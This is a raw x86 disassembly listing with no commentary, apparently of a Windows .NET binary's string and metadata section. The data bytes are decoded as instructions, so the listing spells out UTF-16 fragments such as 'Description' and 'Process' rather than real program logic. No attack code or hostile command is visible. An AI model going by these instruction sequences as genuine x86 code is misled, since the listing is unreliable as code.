  40d12e:	add    BYTE PTR [ebp+0x0],ah
  40d131:	jae    0x40d133
  40d133:	arpl   WORD PTR [eax],ax
  40d135:	jb     0x40d137
  40d137:	imul   eax,DWORD PTR [eax],0x740070
  40d13d:	imul   eax,DWORD PTR [eax],0x6e006f
  40d143:	xor    al,0x55
  40d145:	add    BYTE PTR [ebx+0x0],dh
  40d148:	popa   
  40d149:	add    BYTE PTR [edi+0x0],ah
  40d14c:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  40d151:	add    BYTE PTR [esi+0x0],ch
  40d154:	add    BYTE PTR [di+0x0],dh
  40d158:	popa   
  40d159:	add    BYTE PTR [edi+0x0],ah
  40d15c:	add    BYTE PTR gs:[esi+0x0],dl
  40d160:	bound  eax,QWORD PTR [eax]
  40d162:	inc    esp
  40d163:	add    BYTE PTR [ebp+0x0],ah
  40d166:	jae    0x40d168
  40d168:	arpl   WORD PTR [eax],ax
  40d16a:	jb     0x40d16c
  40d16c:	imul   eax,DWORD PTR [eax],0x740070
  40d172:	imul   eax,DWORD PTR [eax],0x6e006f
  40d178:	sub    al,0x55
  40d17a:	add    BYTE PTR [ebx+0x0],dh
  40d17d:	popa   
  40d17e:	add    BYTE PTR [edi+0x0],ah
  40d181:	add    BYTE PTR gs:[esi+0x0],cl
  40d185:	outs   dx,DWORD PTR ds:[esi]
  40d186:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40d18a:	add    BYTE PTR [edi+0x0],ah
  40d18d:	outs   dx,DWORD PTR ds:[esi]
  40d18e:	add    BYTE PTR [eax+eax*1+0x65],al
  40d192:	add    BYTE PTR [ebx+0x0],dh
  40d195:	arpl   WORD PTR [eax],ax
  40d197:	jb     0x40d199
  40d199:	imul   eax,DWORD PTR [eax],0x740070
  40d19f:	imul   eax,DWORD PTR [eax],0x6e006f
  40d1a5:	and    dl,BYTE PTR [ebp+0x0]
  40d1a8:	jae    0x40d1aa
  40d1aa:	popa   
  40d1ab:	add    BYTE PTR [edi+0x0],ah
  40d1ae:	add    BYTE PTR gs:[ebp+0x0],dl
  40d1b2:	jb     0x40d1b4
  40d1b4:	imul   eax,DWORD PTR [eax],0x610056
  40d1ba:	ins    BYTE PTR es:[edi],dx
  40d1bb:	add    BYTE PTR [ebp+0x0],dh
  40d1be:	add    BYTE PTR gs:[esi+0x0],cl
  40d1c2:	popa   
  40d1c3:	add    BYTE PTR [ebp+0x0],ch
  40d1c6:	add    BYTE PTR gs:[edx*2+0x61007300],ah
  40d1ce:	add    BYTE PTR [edi+0x0],ah
  40d1d1:	add    BYTE PTR gs:[esi+0x0],al
  40d1d5:	imul   eax,DWORD PTR [eax],0x65006c
  40d1db:	push   esi
  40d1dc:	add    BYTE PTR [ecx+0x0],ah
  40d1df:	ins    BYTE PTR es:[edi],dx
  40d1e0:	add    BYTE PTR [ebp+0x0],dh
  40d1e3:	add    BYTE PTR gs:[esi+0x0],cl
  40d1e7:	popa   
  40d1e8:	add    BYTE PTR [ebp+0x0],ch
  40d1eb:	add    BYTE PTR gs:[edx*2+0x61007300],dh
  40d1f3:	add    BYTE PTR [edi+0x0],ah
  40d1f6:	add    BYTE PTR gs:[eax+eax*1+0x61],al
  40d1fb:	add    BYTE PTR [eax+eax*1+0x61],dh
  40d1ff:	add    BYTE PTR [ebx+0x0],dl
  40d202:	add    BYTE PTR gs:[edx+0x0],dh
  40d206:	jbe    0x40d208
  40d208:	imul   eax,DWORD PTR [eax],0x650063
  40d20e:	inc    ebx
  40d20f:	add    BYTE PTR [edi+0x0],ch
  40d212:	ins    BYTE PTR es:[edi],dx
  40d213:	add    BYTE PTR [eax+eax*1+0x65],ch
  40d217:	add    BYTE PTR [ebx+0x0],ah
  40d21a:	je     0x40d21c
  40d21c:	imul   eax,DWORD PTR [eax],0x6e006f
  40d222:	and    dl,BYTE PTR [ebp+0x0]
  40d225:	jae    0x40d227
  40d227:	popa   
  40d228:	add    BYTE PTR [edi+0x0],ah
  40d22b:	add    BYTE PTR gs:[esi+0x0],dl
  40d22f:	add    BYTE PTR gs:[edx+0x0],dh
  40d233:	jae    0x40d235
  40d235:	imul   eax,DWORD PTR [eax],0x6e006f
  40d23b:	xor    DWORD PTR [eax],eax
  40d23d:	inc    esp
  40d23e:	add    BYTE PTR [edi+0x0],ch
  40d241:	je     0x40d243
  40d243:	xor    BYTE PTR [eax],al
  40d245:	and    dl,BYTE PTR [ebp+0x0]
  40d248:	jae    0x40d24a
  40d24a:	popa   
  40d24b:	add    BYTE PTR [edi+0x0],ah
  40d24e:	add    BYTE PTR gs:[esi+0x0],dl
  40d252:	add    BYTE PTR gs:[edx+0x0],dh
  40d256:	jae    0x40d258
  40d258:	imul   eax,DWORD PTR [eax],0x6e006f
  40d25e:	xor    al,BYTE PTR [eax]
  40d260:	inc    esp
  40d261:	add    BYTE PTR [edi+0x0],ch
  40d264:	je     0x40d266
  40d266:	xor    BYTE PTR [eax],al
  40d268:	sbb    BYTE PTR [ebp+0x0],al
  40d26b:	js     0x40d26d
  40d26d:	popa   
  40d26e:	add    BYTE PTR [ebp+0x0],ch
  40d271:	jo     0x40d273
  40d273:	ins    BYTE PTR es:[edi],dx
  40d274:	add    BYTE PTR [ebp+0x0],ah
  40d277:	push   esp
  40d278:	add    BYTE PTR [ecx+0x0],ch
  40d27b:	je     0x40d27d
  40d27d:	ins    BYTE PTR es:[edi],dx
  40d27e:	add    BYTE PTR [ebp+0x0],ah
  40d281:	adc    BYTE PTR [ebp+0x0],al
  40d284:	js     0x40d286
  40d286:	popa   
  40d287:	add    BYTE PTR [ebp+0x0],ch
  40d28a:	jo     0x40d28c
  40d28c:	ins    BYTE PTR es:[edi],dx
  40d28d:	add    BYTE PTR [ebp+0x0],ah
  40d290:	xor    al,0x0
  40d292:	es inc ebp
  40d294:	add    BYTE PTR [eax+0x0],bh
  40d297:	popa   
  40d298:	add    BYTE PTR [ebp+0x0],ch
  40d29b:	jo     0x40d29d
  40d29d:	ins    BYTE PTR es:[edi],dx
  40d29e:	add    BYTE PTR [ebp+0x0],ah
  40d2a1:	xor    al,0x0
  40d2a3:	inc    esp
  40d2a4:	add    BYTE PTR [ebp+0x0],ah
  40d2a7:	jae    0x40d2a9
  40d2a9:	arpl   WORD PTR [eax],ax
  40d2ab:	jb     0x40d2ad
  40d2ad:	imul   eax,DWORD PTR [eax],0x740070
  40d2b3:	imul   eax,DWORD PTR [eax],0x6e006f
  40d2b9:	adc    BYTE PTR [ebp+0x0],al
  40d2bc:	js     0x40d2be
  40d2be:	popa   
  40d2bf:	add    BYTE PTR [ebp+0x0],ch
  40d2c2:	jo     0x40d2c4
  40d2c4:	ins    BYTE PTR es:[edi],dx
  40d2c5:	add    BYTE PTR [ebp+0x0],ah
  40d2c8:	xor    eax,0x452600
  40d2cd:	js     0x40d2cf
  40d2cf:	popa   
  40d2d0:	add    BYTE PTR [ebp+0x0],ch
  40d2d3:	jo     0x40d2d5
  40d2d5:	ins    BYTE PTR es:[edi],dx
  40d2d6:	add    BYTE PTR [ebp+0x0],ah
  40d2d9:	xor    eax,0x65004400
  40d2de:	add    BYTE PTR [ebx+0x0],dh
  40d2e1:	arpl   WORD PTR [eax],ax
  40d2e3:	jb     0x40d2e5
  40d2e5:	imul   eax,DWORD PTR [eax],0x740070
  40d2eb:	imul   eax,DWORD PTR [eax],0x6e006f
  40d2f1:	adc    BYTE PTR [ebp+0x0],al
  40d2f4:	js     0x40d2f6
  40d2f6:	popa   
  40d2f7:	add    BYTE PTR [ebp+0x0],ch
  40d2fa:	jo     0x40d2fc
  40d2fc:	ins    BYTE PTR es:[edi],dx
  40d2fd:	add    BYTE PTR [ebp+0x0],ah
  40d300:	add    BYTE PTR ss:[esi],ah
  40d303:	inc    ebp
  40d304:	add    BYTE PTR [eax+0x0],bh
  40d307:	popa   
  40d308:	add    BYTE PTR [ebp+0x0],ch
  40d30b:	jo     0x40d30d
  40d30d:	ins    BYTE PTR es:[edi],dx
  40d30e:	add    BYTE PTR [ebp+0x0],ah
  40d311:	add    BYTE PTR ss:[eax+eax*1+0x65],al
  40d316:	add    BYTE PTR [ebx+0x0],dh
  40d319:	arpl   WORD PTR [eax],ax
  40d31b:	jb     0x40d31d
  40d31d:	imul   eax,DWORD PTR [eax],0x740070
  40d323:	imul   eax,DWORD PTR [eax],0x6e006f
  40d329:	push   ss
  40d32a:	dec    esi
  40d32b:	add    BYTE PTR [edi+0x0],ch
  40d32e:	inc    ecx
  40d32f:	add    BYTE PTR [edx+0x0],dh
  40d332:	add    BYTE PTR [di+0x0],dh
  40d336:	ins    DWORD PTR es:[edi],dx
  40d337:	add    BYTE PTR [ebp+0x0],ah
  40d33a:	outs   dx,BYTE PTR ds:[esi]
  40d33b:	add    BYTE PTR [eax+eax*1+0x73],dh
  40d33f:	add    BYTE PTR [eax],ch
  40d341:	inc    edx
  40d342:	add    BYTE PTR [ecx+0x0],ah
  40d345:	add    BYTE PTR fs:[eax+eax*1+0x79],ch
  40d34a:	add    BYTE PTR [esi+0x0],al
  40d34d:	outs   dx,DWORD PTR ds:[esi]
  40d34e:	add    BYTE PTR [edx+0x0],dh
  40d351:	ins    DWORD PTR es:[edi],dx
  40d352:	add    BYTE PTR [ebp+0x0],ah
  40d355:	add    BYTE PTR fs:[eax+0x0],dl
  40d359:	popa   
  40d35a:	add    BYTE PTR [edx+0x0],dh
  40d35d:	popa   
  40d35e:	add    BYTE PTR [ebp+0x0],ch
  40d361:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40d366:	add    BYTE PTR [edx+0x0],dh
  40d369:	and    al,0x49
  40d36b:	add    BYTE PTR [esi+0x0],ch
  40d36e:	jbe    0x40d370
  40d370:	popa   
  40d371:	add    BYTE PTR [eax+eax*1+0x69],ch
  40d375:	add    BYTE PTR [eax+eax*1+0x50],ah
  40d379:	add    BYTE PTR [ecx+0x0],ah
  40d37c:	jb     0x40d37e
  40d37e:	popa   
  40d37f:	add    BYTE PTR [ebp+0x0],ch
  40d382:	push   ebx
  40d383:	add    BYTE PTR [edi+0x0],dh
  40d386:	imul   eax,DWORD PTR [eax],0x630074
  40d38c:	push   0x492a00
  40d391:	outs   dx,BYTE PTR ds:[esi]
  40d392:	add    BYTE PTR [esi+0x0],dh
  40d395:	popa   
  40d396:	add    BYTE PTR [eax+eax*1+0x69],ch
  40d39a:	add    BYTE PTR [eax+eax*1+0x45],ah
  40d39e:	add    BYTE PTR [esi+0x0],ch
  40d3a1:	jne    0x40d3a3
  40d3a3:	ins    DWORD PTR es:[edi],dx
  40d3a4:	add    BYTE PTR [eax+0x0],dl
  40d3a7:	popa   
  40d3a8:	add    BYTE PTR [edx+0x0],dh
  40d3ab:	popa   
  40d3ac:	add    BYTE PTR [ebp+0x0],ch
  40d3af:	push   esi
  40d3b0:	add    BYTE PTR [ecx+0x0],ah
  40d3b3:	ins    BYTE PTR es:[edi],dx
  40d3b4:	add    BYTE PTR [ebp+0x0],dh
  40d3b7:	add    BYTE PTR gs:[edx],ah
  40d3ba:	dec    ebp
  40d3bb:	add    BYTE PTR [ecx+0x0],ch
  40d3be:	jae    0x40d3c0
  40d3c0:	jae    0x40d3c2
  40d3c2:	imul   eax,DWORD PTR [eax],0x67006e
  40d3c8:	push   eax
  40d3c9:	add    BYTE PTR [ecx+0x0],ah
  40d3cc:	jb     0x40d3ce
  40d3ce:	popa   
  40d3cf:	add    BYTE PTR [ebp+0x0],ch
  40d3d2:	push   esi
  40d3d3:	add    BYTE PTR [ecx+0x0],ah
  40d3d6:	ins    BYTE PTR es:[edi],dx
  40d3d7:	add    BYTE PTR [ebp+0x0],dh
  40d3da:	add    BYTE PTR gs:[eax],ch
  40d3dd:	dec    ebp
  40d3de:	add    BYTE PTR [ecx+0x0],ch
  40d3e1:	jae    0x40d3e3
  40d3e3:	jae    0x40d3e5
  40d3e5:	imul   eax,DWORD PTR [eax],0x67006e
  40d3eb:	push   edx
  40d3ec:	add    BYTE PTR [ebp+0x0],ah
  40d3ef:	jno    0x40d3f1
  40d3f1:	jne    0x40d3f3
  40d3f3:	imul   eax,DWORD PTR [eax],0x650072
  40d3f9:	add    BYTE PTR fs:[eax+0x0],dl
  40d3fd:	popa   
  40d3fe:	add    BYTE PTR [edx+0x0],dh
  40d401:	popa   
  40d402:	add    BYTE PTR [ebp+0x0],ch
  40d405:	push   ds
  40d406:	dec    ebp
  40d407:	add    BYTE PTR [ecx+0x0],ch
  40d40a:	jae    0x40d40c
  40d40c:	jae    0x40d40e
  40d40e:	imul   eax,DWORD PTR [eax],0x67006e
  40d414:	inc    esi
  40d415:	add    BYTE PTR [ecx+0x0],ch
  40d418:	ins    BYTE PTR es:[edi],dx
  40d419:	add    BYTE PTR [ebp+0x0],ah
  40d41c:	dec    esi
  40d41d:	add    BYTE PTR [ecx+0x0],ah
  40d420:	ins    DWORD PTR es:[edi],dx
  40d421:	add    BYTE PTR [ebp+0x0],ah
  40d424:	cmp    BYTE PTR [ebp+0x0],dl
  40d427:	outs   dx,BYTE PTR ds:[esi]
  40d428:	add    BYTE PTR [ecx+0x0],ah
  40d42b:	bound  eax,QWORD PTR [eax]
  40d42d:	ins    BYTE PTR es:[edi],dx
  40d42e:	add    BYTE PTR [ebp+0x0],ah
  40d431:	push   esp
  40d432:	add    BYTE PTR [edi+0x0],ch
  40d435:	inc    esi
  40d436:	add    BYTE PTR [ecx+0x0],ch
  40d439:	outs   dx,BYTE PTR ds:[esi]
  40d43a:	add    BYTE PTR [eax+eax*1+0x53],ah
  40d43e:	add    BYTE PTR [eax+0x0],dh
  40d441:	add    BYTE PTR gs:[ebx+0x0],ah
  40d445:	imul   eax,DWORD PTR [eax],0x690066
  40d44b:	add    BYTE PTR gs:[eax+eax*1+0x44],ah
  40d450:	add    BYTE PTR [ecx+0x0],ch
  40d453:	jb     0x40d455
  40d455:	push   eax
  40d456:	add    BYTE PTR [ecx+0x0],ah
  40d459:	je     0x40d45b
  40d45b:	push   0x502c00
  40d460:	popa   
  40d461:	add    BYTE PTR [eax+eax*1+0x68],dh
  40d465:	add    BYTE PTR [ecx+0x0],al
  40d468:	jb     0x40d46a
  40d46a:	add    BYTE PTR [di+0x0],dh
  40d46e:	ins    DWORD PTR es:[edi],dx
  40d46f:	add    BYTE PTR [ebp+0x0],ah
  40d472:	outs   dx,BYTE PTR ds:[esi]
  40d473:	add    BYTE PTR [eax+eax*1+0x49],dh
  40d477:	add    BYTE PTR [ebx+0x0],dh
  40d47a:	dec    esi
  40d47b:	add    BYTE PTR [edi+0x0],ch
  40d47e:	je     0x40d480
  40d480:	push   esi
  40d481:	add    BYTE PTR [ecx+0x0],ah
  40d484:	ins    BYTE PTR es:[edi],dx
  40d485:	add    BYTE PTR [ecx+0x0],ch
  40d488:	add    BYTE PTR fs:[esi],bl
  40d48b:	dec    ecx
  40d48c:	add    BYTE PTR [esi+0x0],ch
  40d48f:	jbe    0x40d491
  40d491:	popa   
  40d492:	add    BYTE PTR [eax+eax*1+0x69],ch
  40d496:	add    BYTE PTR [eax+eax*1+0x46],ah
  40d49a:	add    BYTE PTR [ecx+0x0],ch
  40d49d:	ins    BYTE PTR es:[edi],dx
  40d49e:	add    BYTE PTR [ebp+0x0],ah
  40d4a1:	push   esp
  40d4a2:	add    BYTE PTR [ecx+0x0],bh
  40d4a5:	jo     0x40d4a7
  40d4a7:	add    BYTE PTR gs:[esi],dh
  40d4aa:	inc    ebp
  40d4ab:	add    BYTE PTR [eax+eax*1+0x6d],ah
  40d4af:	add    BYTE PTR [ebx+0x0],dl
  40d4b2:	arpl   WORD PTR [eax],ax
  40d4b4:	push   0x6d006500
  40d4b9:	add    BYTE PTR [ecx+0x0],ah
  40d4bc:	inc    ebp
  40d4bd:	add    BYTE PTR [edx+0x0],dh
  40d4c0:	jb     0x40d4c2
  40d4c2:	outs   dx,DWORD PTR ds:[esi]
  40d4c3:	add    BYTE PTR [edx+0x0],dh
  40d4c6:	push   ebx
  40d4c7:	add    BYTE PTR [ebp+0x0],ah
  40d4ca:	jbe    0x40d4cc
  40d4cc:	add    BYTE PTR gs:[edx+0x0],dh
  40d4d0:	imul   eax,DWORD PTR [eax],0x790074
  40d4d6:	inc    ebp
  40d4d7:	add    BYTE PTR [edx+0x0],dh
  40d4da:	jb     0x40d4dc
  40d4dc:	outs   dx,DWORD PTR ds:[esi]
  40d4dd:	add    BYTE PTR [edx+0x0],dh
  40d4e0:	cmp    al,BYTE PTR [ebp+0x0]
  40d4e3:	add    BYTE PTR fs:[ebp+0x0],ch
  40d4e7:	push   ebx
  40d4e8:	add    BYTE PTR [ebx+0x0],ah
  40d4eb:	push   0x6d006500
  40d4f0:	add    BYTE PTR [ecx+0x0],ah
  40d4f3:	inc    ebp
  40d4f4:	add    BYTE PTR [edx+0x0],dh
  40d4f7:	jb     0x40d4f9
  40d4f9:	outs   dx,DWORD PTR ds:[esi]
  40d4fa:	add    BYTE PTR [edx+0x0],dh
  40d4fd:	push   ebx
  40d4fe:	add    BYTE PTR [ebp+0x0],ah
  40d501:	jbe    0x40d503
  40d503:	add    BYTE PTR gs:[edx+0x0],dh
  40d507:	imul   eax,DWORD PTR [eax],0x790074
  40d50d:	push   edi
  40d50e:	add    BYTE PTR [ecx+0x0],ah
  40d511:	jb     0x40d513
  40d513:	outs   dx,BYTE PTR ds:[esi]
  40d514:	add    BYTE PTR [ecx+0x0],ch
  40d517:	outs   dx,BYTE PTR ds:[esi]
  40d518:	add    BYTE PTR [edi+0x0],ah
  40d51b:	cmp    al,BYTE PTR [ebp+0x0]
  40d51e:	add    BYTE PTR fs:[ebp+0x0],ch
  40d522:	push   ebx
  40d523:	add    BYTE PTR [ebx+0x0],ah
  40d526:	push   0x6d006500
  40d52b:	add    BYTE PTR [ecx+0x0],ah
  40d52e:	inc    ebp
  40d52f:	add    BYTE PTR [edx+0x0],dh
  40d532:	jb     0x40d534
  40d534:	outs   dx,DWORD PTR ds:[esi]
  40d535:	add    BYTE PTR [edx+0x0],dh
  40d538:	push   ebx
  40d539:	add    BYTE PTR [ebp+0x0],ah
  40d53c:	jbe    0x40d53e
  40d53e:	add    BYTE PTR gs:[edx+0x0],dh
  40d542:	imul   eax,DWORD PTR [eax],0x790074
  40d548:	push   ebp
  40d549:	add    BYTE PTR [esi+0x0],ch
  40d54c:	imul   eax,DWORD PTR [eax],0x6e
  40d54f:	add    BYTE PTR [edi+0x0],ch
  40d552:	ja     0x40d554
  40d554:	outs   dx,BYTE PTR ds:[esi]
  40d555:	add    BYTE PTR [esi],dl
  40d557:	inc    esi
  40d558:	add    BYTE PTR [ecx+0x0],ch
  40d55b:	ins    BYTE PTR es:[edi],dx
  40d55c:	add    BYTE PTR [ebp+0x0],ah
  40d55f:	push   ebp
  40d560:	add    BYTE PTR [esi+0x0],ch
  40d563:	imul   eax,DWORD PTR [eax],0x6e
  40d566:	add    BYTE PTR [edi+0x0],ch
  40d569:	ja     0x40d56b
  40d56b:	outs   dx,BYTE PTR ds:[esi]
  40d56c:	add    BYTE PTR [edx],ch
  40d56e:	pop    edx
  40d56f:	add    BYTE PTR [ebp+0x0],ah
  40d572:	jb     0x40d574
  40d574:	outs   dx,DWORD PTR ds:[esi]
  40d575:	add    BYTE PTR [esi+0x0],al
  40d578:	imul   eax,DWORD PTR [eax],0x65006c
  40d57e:	jae    0x40d580
  40d580:	inc    esi
  40d581:	add    BYTE PTR [edi+0x0],ch
  40d584:	jb     0x40d586
  40d586:	push   eax
  40d587:	add    BYTE PTR [ecx+0x0],ah
  40d58a:	jb     0x40d58c
  40d58c:	popa   
  40d58d:	add    BYTE PTR [ebp+0x0],ch
  40d590:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40d595:	add    BYTE PTR [edx+0x0],dh
  40d598:	xor    BYTE PTR [eax+eax*1+0x6f],dl
  40d59c:	add    BYTE PTR [edi+0x0],ch
  40d59f:	dec    ebp
  40d5a0:	add    BYTE PTR [ecx+0x0],ah
  40d5a3:	outs   dx,BYTE PTR ds:[esi]
  40d5a4:	add    BYTE PTR [ecx+0x0],bh
  40d5a7:	inc    esi
  40d5a8:	add    BYTE PTR [ecx+0x0],ch
  40d5ab:	ins    BYTE PTR es:[edi],dx
  40d5ac:	add    BYTE PTR [ebp+0x0],ah
  40d5af:	jae    0x40d5b1
  40d5b1:	inc    esi
  40d5b2:	add    BYTE PTR [edi+0x0],ch
  40d5b5:	jb     0x40d5b7
  40d5b7:	push   eax
  40d5b8:	add    BYTE PTR [ecx+0x0],ah
  40d5bb:	jb     0x40d5bd
  40d5bd:	popa   
  40d5be:	add    BYTE PTR [ebp+0x0],ch
  40d5c1:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40d5c6:	add    BYTE PTR [edx+0x0],dh
  40d5c9:	sbb    BYTE PTR [ebp+0x0],al
  40d5cc:	js     0x40d5ce
  40d5ce:	arpl   WORD PTR [eax],ax
  40d5d0:	ins    BYTE PTR es:[edi],dx
  40d5d1:	add    BYTE PTR [ebp+0x0],dh
  40d5d4:	jae    0x40d5d6
  40d5d6:	imul   eax,DWORD PTR [eax],0x650076
  40d5dc:	push   ebp
  40d5dd:	add    BYTE PTR [edx+0x0],dh
  40d5e0:	imul   eax,DWORD PTR [eax],0x6500565c
  40d5e6:	add    BYTE PTR [edx+0x0],dh
  40d5e9:	jae    0x40d5eb
  40d5eb:	imul   eax,DWORD PTR [eax],0x6e006f
  40d5f1:	push   esi
  40d5f2:	add    BYTE PTR [ecx],dh
  40d5f4:	add    BYTE PTR [edx+0x0],dl
  40d5f7:	add    BYTE PTR gs:[ecx+0x0],dh
  40d5fb:	jne    0x40d5fd
  40d5fd:	imul   eax,DWORD PTR [eax],0x650072
  40d603:	jae    0x40d605
  40d605:	push   ebp
  40d606:	add    BYTE PTR [ebx+0x0],dh
  40d609:	add    BYTE PTR gs:[eax+eax*1+0x61],al
  40d60e:	add    BYTE PTR [eax+eax*1+0x61],dh
  40d612:	add    BYTE PTR [ebx+0x0],dl
  40d615:	add    BYTE PTR gs:[edx+0x0],dh
  40d619:	jbe    0x40d61b
  40d61b:	imul   eax,DWORD PTR [eax],0x650063
  40d621:	inc    ebx
  40d622:	add    BYTE PTR [edi+0x0],ch
  40d625:	ins    BYTE PTR es:[edi],dx
  40d626:	add    BYTE PTR [eax+eax*1+0x65],ch
  40d62a:	add    BYTE PTR [ebx+0x0],ah
  40d62d:	je     0x40d62f
  40d62f:	imul   eax,DWORD PTR [eax],0x6e006f
  40d635:	inc    esi
  40d636:	add    BYTE PTR [ecx+0x0],ah
  40d639:	ins    BYTE PTR es:[edi],dx
  40d63a:	add    BYTE PTR [ebx+0x0],dh
  40d63d:	add    BYTE PTR gs:[ebx],al
  40d640:	push   es
  40d641:	adc    dh,BYTE PTR [ebx+eax*1+0x6]
  40d645:	adc    ch,BYTE PTR [ebp+0x4]
  40d648:	add    BYTE PTR [eax],al
  40d64a:	adc    dh,BYTE PTR [esp+eax*1+0x0]
  40d64e:	add    BYTE PTR [edx],dl
  40d650:	jno    0x40d658
  40d652:	add    BYTE PTR [edx],al
  40d654:	push   cs
  40d655:	push   cs
  40d656:	sbb    eax,0x100041c
  40d65b:	push   cs
  40d65c:	push   cs
  40d65d:	add    al,0x8
  40d65f:	add    BYTE PTR [edx],dl
  40d661:	jno    0x40d669
  40d663:	and    BYTE PTR [ecx],al
  40d665:	add    DWORD PTR [ecx],edx
  40d667:	cmp    BYTE PTR [ebp+0x10],0x0
  40d66e:	add    BYTE PTR [eax],al
  40d670:	add    BYTE PTR [eax],al
  40d672:	add    al,0x0
  40d674:	add    BYTE PTR [eax],al
  40d676:	add    BYTE PTR [eax],al
  40d678:	add    BYTE PTR [eax],al
  40d67a:	push   es
  40d67b:	and    BYTE PTR [ecx],al
  40d67d:	add    DWORD PTR [ecx],edx
  40d67f:	or     ch,0x19
  40d682:	add    DWORD PTR [eax],eax
  40d684:	add    BYTE PTR [eax],0x0
  40d687:	add    BYTE PTR [ecx],al
  40d689:	add    BYTE PTR [edx+eax*1+0xd],dl
  40d68d:	inc    ecx
  40d68e:	ins    BYTE PTR es:[edi],dx
  40d68f:	ins    BYTE PTR es:[edi],dx
  40d690:	outs   dx,DWORD PTR ds:[esi]
  40d691:	ja     0x40d6e0
  40d693:	jne    0x40d701
  40d695:	je     0x40d700
  40d697:	jo     0x40d705
  40d699:	add    BYTE PTR gs:[eax+eax*1],al
  40d69d:	add    DWORD PTR [edx],eax
  40d69f:	push   cs
  40d6a0:	pop    es
  40d6a1:	adc    eax,0x8023112
  40d6a6:	adc    bl,BYTE PTR [eax]
  40d6a8:	push   es
  40d6a9:	and    BYTE PTR [edx],al
  40d6ab:	sbb    al,0x1c
  40d6ad:	sbb    eax,0x20041c
  40d6b2:	adc    ah,BYTE PTR [ecx]
  40d6b4:	push   es
  40d6b5:	pop    es
  40d6b6:	add    dl,BYTE PTR [edx]
  40d6b8:	adc    ch,0x2
  40d6bb:	push   es
  40d6bc:	pop    es
  40d6bd:	add    bl,BYTE PTR [edx+edx*1]
  40d6c0:	adc    ch,0x7
  40d6c3:	and    BYTE PTR [ebx],al
  40d6c5:	add    DWORD PTR [esp+ebx*1],ebx
  40d6c8:	sbb    eax,0x100071c
  40d6cd:	adc    dh,BYTE PTR ds:0x7dd8011
  40d6d3:	add    BYTE PTR [ecx],al
  40d6d5:	adc    al,BYTE PTR [eax+0x73512e1]
  40d6db:	and    BYTE PTR [edx],al
  40d6dd:	add    cl,BYTE PTR [esi]
  40d6df:	adc    DWORD PTR [eax+0x5070ae5],eax
  40d6e5:	add    bl,BYTE PTR [esp+ebx*1]
  40d6e8:	adc    cl,BYTE PTR [ebp+0x12]
  40d6eb:	sub    cl,0x5
  40d6ee:	add    BYTE PTR [edx],al
  40d6f0:	add    cl,BYTE PTR [esi]
  40d6f2:	push   cs
  40d6f3:	push   es
  40d6f4:	add    BYTE PTR [ecx],al
  40d6f6:	sbb    eax,0x635120e
  40d6fb:	and    BYTE PTR [ecx],al
  40d6fd:	adc    al,BYTE PTR [eax+0x7090eed]
  40d703:	add    al,0x12
  40d705:	sub    ch,0xe
  40d708:	sbb    eax,0x2005080e
  40d70d:	add    DWORD PTR [edx],eax
  40d70f:	adc    dh,BYTE PTR ds:0x1012005
  40d715:	adc    eax,DWORD PTR [eax]
  40d717:	pop    es
  40d718:	pop    es
  40d719:	add    DWORD PTR ds:0xe011512,edx
  40d71f:	pop    es
  40d720:	adc    eax,0x12023912
  40d725:	or     al,0x2
  40d727:	pop    es
  40d728:	adc    eax,0xe023912
  40d72d:	adc    cl,BYTE PTR [ebx+ecx*1]
  40d730:	and    BYTE PTR [eax],al
  40d732:	adc    eax,0x2f18012
  40d737:	adc    eax,DWORD PTR [eax]
  40d739:	adc    eax,DWORD PTR [ecx]
  40d73b:	or     BYTE PTR ds:0x2f18012,dl
  40d741:	push   cs
  40d742:	adc    cl,BYTE PTR [ebx+ecx*1]
  40d745:	and    BYTE PTR [eax],al
  40d747:	adc    eax,0x2f58011
  40d74c:	adc    eax,DWORD PTR [eax]
  40d74e:	adc    eax,DWORD PTR [ecx]
  40d750:	or     BYTE PTR ds:0x2f58011,dl
  40d756:	push   cs
  40d757:	adc    cl,BYTE PTR [esp+eax*1]
  40d75a:	and    BYTE PTR [eax],al
  40d75c:	adc    eax,DWORD PTR [ecx]
  40d75e:	add    eax,0x13020120
  40d763:	add    BYTE PTR [edi],al
  40d765:	and    BYTE PTR [edx],al
  40d767:	add    DWORD PTR [ebx],edx
  40d769:	add    BYTE PTR [ebx],dl
  40d76b:	add    DWORD PTR [esi],eax
  40d76d:	and    BYTE PTR [ecx],al
  40d76f:	adc    eax,DWORD PTR [ecx]
  40d771:	adc    eax,DWORD PTR [eax]
  40d773:	or     esp,DWORD PTR [eax]
  40d775:	add    BYTE PTR ds:0x2f98011,dl
  40d77b:	adc    eax,DWORD PTR [eax]
  40d77d:	adc    eax,DWORD PTR [ecx]
  40d77f:	or     BYTE PTR ds:0x2f98011,dl
  40d785:	adc    cl,BYTE PTR [edx+eax*1]
  40d788:	or     ah,BYTE PTR [eax]
  40d78a:	add    BYTE PTR ds:0x13024111,dl
  40d790:	add    BYTE PTR [ebx],dl
  40d792:	add    DWORD PTR [edi],eax
  40d794:	adc    eax,0x12024111
  40d799:	or     al,0x2
  40d79b:	add    al,0x20
  40d79d:	add    BYTE PTR [ebx],dl
  40d79f:	add    BYTE PTR [edx],ch
  40d7a1:	pop    es
  40d7a2:	or     edx,DWORD PTR ds:0x12023912
  40d7a8:	or     al,0x2
  40d7aa:	adc    cl,BYTE PTR [esi+ecx*1]
  40d7ad:	push   cs
  40d7ae:	push   cs
  40d7af:	adc    cl,BYTE PTR [edx*1+0x12024111]
  40d7b6:	or     al,0x2
  40d7b8:	adc    eax,0x2f58011
  40d7bd:	push   cs
  40d7be:	adc    cl,BYTE PTR [ebx*1+0x1115080e]
  40d7c5:	cmp    cl,0x2
  40d7c8:	adc    cl,BYTE PTR [edx+eax*1]
  40d7cb:	push   es
  40d7cc:	pop    es
  40d7cd:	add    ecx,DWORD PTR [esi]
  40d7cf:	sbb    eax,0x2004080e
  40d7d4:	add    DWORD PTR [ebx],eax
  40d7d6:	or     BYTE PTR ds:0x3080220,al
  40d7dc:	or     BYTE PTR ds:0x80e0220,al
  40d7e2:	or     BYTE PTR ds:0x8080307,al
  40d7e8:	add    al,BYTE PTR ds:0x80120000
  40d7ee:	std    
  40d7ef:	or     ah,BYTE PTR [eax]
  40d7f1:	add    DWORD PTR [ecx],eax
  40d7f3:	adc    eax,0x1018112
  40d7f8:	adc    eax,DWORD PTR [eax]
  40d7fa:	or     BYTE PTR [eax],ah
  40d7fc:	add    DWORD PTR ds:0x81112d12,ebx
